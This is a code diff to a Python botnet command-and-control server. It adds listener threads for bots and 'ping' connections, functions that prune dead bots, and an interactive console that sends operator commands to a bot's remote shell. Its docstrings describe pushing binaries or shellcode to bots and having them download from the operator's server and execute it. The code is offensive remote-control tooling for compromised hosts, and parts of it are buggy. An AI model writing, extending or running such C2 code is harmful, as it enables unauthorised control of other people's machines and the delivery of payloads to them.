@@ -13,6 +13,7 @@ import http.server
 import socketserver
 
 bots=[]
+PingBots=[]
 myip="192.168.1.8"
 httpPort=6080
 port = 6061
@@ -60,12 +61,18 @@ def start_listing(port):
 #             # todo - errors
 #             pass
 
+"""
+Execute command locally
+"""
 def execute_command(command):
     if len(command) > 0:
         print(command)
         proc = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, cwd="/tmp")
         return proc
 
+"""
+Get the host's IP
+"""
 def getIP():
     ip = requests.session().get("http://httpbin.org/ip").text.split(":")[1].split('"')[1]
     print(ip)
@@ -116,13 +123,11 @@ LocalLocation is the location on the server
 RLocation is the file name for the bot
 
 The idea is to run python HTTP service in the server.
-Send command to execute..
+Send command to download from my server.. 
 execute
 close the connection by killing two processes.
 
-
 # TODO Try to find a way to make this happen.
-
 
 """
 def B2A(LocalLocation,sendANDrun):
@@ -160,7 +165,7 @@ def B2A(LocalLocation,sendANDrun):
 
 
 """
-
+^^^^^^^ Handler
 """
 def B2AHandler():
     try:
@@ -169,31 +174,6 @@ def B2AHandler():
     except KeyboardInterrupt:
         return
     B2A(LocalLocation,sendANDrun)
-
-def send_message(bot):
-    #Setup
-    conn = bot[0]
-    addr = bot[1]
-    ip = conn.getpeername()[0]
-    port = conn.getpeername()[1]
-
-    print("send_message started")
-    while True:
-        try:
-            message = input("").split("\n")[0]
-            # end shell mode
-            if message == "exit shell":
-                break
-            message = message + "\r\n"
-            if len(message) != 0:
-                conn.send(message.encode('utf-8'))
-        except KeyboardInterrupt:
-            print("KeyboardInterrupt")
-            return
-        except:
-            # todo - errors
-            print("Error")
-            pass
 
 
 """
@@ -260,6 +240,35 @@ def SR(command,conn,r_buffer,waitForData):
             return
 
 """
+Read from the console and send it to a specific bot 
+It will be called by Talk(), Talk() will receive all data from the bot, this function will send commands.
+"""
+def send_message(bot):
+    #Setup
+    conn = bot[0]
+    addr = bot[1]
+    ip = conn.getpeername()[0]
+    port = conn.getpeername()[1]
+
+    print("send_message started")
+    while True:
+        try:
+            message = input("").split("\n")[0]
+            # end shell mode
+            if message == "exit shell":
+                break
+            message = message + "\r\n"
+            if len(message) != 0:
+                conn.send(message.encode('utf-8'))
+        except KeyboardInterrupt:
+            print("KeyboardInterrupt")
+            return
+        except:
+            # todo - errors
+            print("Error")
+            return -1
+
+"""
 Start shell mode
 """
 def talk(bot):
@@ -282,21 +291,59 @@ def talk(bot):
         except:
             pass
 
-
+"""
+Stylish input()
+"""
 def s_input(string):
     return input("["+string+"]>").strip("\n")
+
+"""
+Remove all dead bots in "bots" list
+"""
+def refreshBots():
+    for bot in bots:
+        try:
+            conn = bot[0]
+            # If bot is not alive
+            if '2049' == str(conn.type):
+                bots.remove(bot)
+        except:
+            pass
+
+"""
+Remove all dead bots in "PingBots" list
+"""
+def refreshPingBots():
+    for bot in PingBots:
+        try:
+            conn = bot[0]
+            # If bot is not alive
+            if '2049' == str(conn.type):
+                bots.remove(bot)
+        except:
+            pass
 
 """
 print all bots
 """
 def list():
     #[conn, addr]
+    refreshBots()
     for bot in bots:
         try:
             addr = bot[1]
             conn = bot[0]
             ip = addr[0]
             port = addr[1]
+
+            # TODO Test this Theory: This "conn.send()" method might kill the client.
+            # Why? I guess this might timeout the Send() method in the other side.
+            # Because it the other side has to send the output, right?
+            try:
+                conn.send("\r\n".encode('utf-8'))
+            except:
+                print("A Client has disconnected")
+                continue
             print(str(ip)+" at "+str(port))
         except:
             pass
@@ -312,10 +359,12 @@ def kill_all():
 Find a match
 name = ip
 """
-def find_bot(name):
+def find_bot(portNumber):
     for bot in bots:
+        addr = bot[1]
+        port = addr[1]
         ip = bot[0].getpeername()[0]
-        if name == ip:
+        if portNumber == str(port):
             return bot
     return []
 
@@ -328,16 +377,25 @@ def help(type):
               "B2I       Send a Binary/Shellcode 2 one IP")
     pass
 
+"""
+Wake up dead bots, by sending "1111" to the bot.
+#TODO Fix "1111"! just use one byte!!!
+"""
 def ping():
-    # new implementation
-    # [conn, addr, pingConn, pingAddr]
-    for bot in bots:
-        pingConn = bot[3]
-        pingAddr = bot[2]
-        SR("111",pingConn,1024,0)
-        pass
+    # [pingConn, pingAddr]
+    refreshPingBots()
+    for bot in PingBots:
+        print("ping()")
+        pingConn = bot[0]
+        pingAddr = bot[1]
+        print(pingAddr)
+        sendthis = "111111\n\0"
+        print(sendthis)
+        SR(sendthis,pingConn,1024,0)
 
-
+"""
+Console 
+"""
 def console():
     while 1:
         Command = s_input("MB:~")
@@ -375,26 +433,46 @@ def console():
         else:
             pass
 
-def main():
-    global bots
-    #pingSock = start_listing(pingPort)
-    mainSock = start_listing(port)
-    consoleT = threading.Thread(target=console, args=())
-    consoleT.daemon = True
-    consoleT.start()
-
+def pingSockFun(consoleT,pingSock):
     while consoleT.isAlive():
         try:
-            #pingConn, pingAddr = pingSock.accept()
+            pingConn, pingAddr = pingSock.accept()
+            print("\n"+str(pingAddr[0])+":"+str(pingAddr[1])+" has connected - ping")
+            SR("111111\n\0",pingConn,1024,0)
+
+            PingBots.append([pingConn, pingAddr])
+        except:
+            pass
+    pingSock.close()
+
+def mainSockFun(consoleT,mainSock):
+    while consoleT.isAlive():
+        try:
             conn, addr = mainSock.accept()
-            #print("\n"+str(pingAddr[0])+":"+str(pingAddr[1])+" has connected - ping")
             print("\n"+str(addr[0])+":"+str(addr[1])+" has connected")
-            #bots.append([conn, addr,pingConn,pingAddr])
+
             bots.append([conn, addr])
         except:
             pass
     mainSock.close()
-    #pingSock.close()
+
+def main():
+    global bots
+    mainSock = start_listing(port)
+    pingSock = start_listing(pingPort)
+    consoleT = threading.Thread(target=console, args=())
+    consoleT.daemon = True
+    consoleT.start()
+
+    tr1 = threading.Thread(target=pingSockFun, args=(consoleT,pingSock,))
+    tr2 = threading.Thread(target=mainSockFun, args=(consoleT,mainSock,))
+    tr1.daemon = True
+    tr2.daemon = True
+    tr2.start()
+    tr1.start()
+
+    tr1.join()
+    tr2.join()
 
 if __name__ == '__main__':
     pass
